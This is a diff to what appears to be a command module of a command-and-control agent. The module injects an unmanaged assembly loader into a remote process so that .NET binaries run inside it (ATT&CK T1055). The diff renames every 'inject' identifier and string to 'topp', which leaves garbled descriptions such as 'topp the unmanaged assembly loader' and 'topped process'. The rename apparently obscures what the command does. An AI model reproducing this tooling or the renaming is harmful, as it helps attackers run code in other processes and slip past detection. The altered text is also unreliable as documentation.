@@ -12,7 +12,7 @@ import donut
 
 EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"
 
-class AssemblyInjectArguments(TaskArguments):
+class AssemblytoppArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -100,14 +100,14 @@ class AssemblyInjectArguments(TaskArguments):
             self.load_args_from_json_string(self.command_line)
 
 
-class AssemblyInjectCommand(CommandBase):
-    cmd = "assembly_inject"
+class AssemblytoppCommand(CommandBase):
+    cmd = "assembly_topp"
     needs_admin = False
-    help_cmd = "assembly_inject [pid] [assembly] [args]"
+    help_cmd = "assembly_topp [pid] [assembly] [args]"
     description = "topp the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the topped process."
     version = 3
     author = "@djhohnstein"
-    argument_class = AssemblyInjectArguments
+    argument_class = AssemblytoppArguments
     attackmapping = ["T1055"]
 
     async def build_exeasm(self):
@@ -150,7 +150,7 @@ class AssemblyInjectCommand(CommandBase):
         if file_resp.Success:
             taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
-            raise Exception("Failed to register assembly_inject DLL: " + file_resp.Error)
+            raise Exception("Failed to register assembly_topp DLL: " + file_resp.Error)
         originalGroupNameIsDefault = taskData.args.get_parameter_group_name() == "Default"
         if taskData.args.get_parameter_group_name() == "New Assembly":
             fileSearchResp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
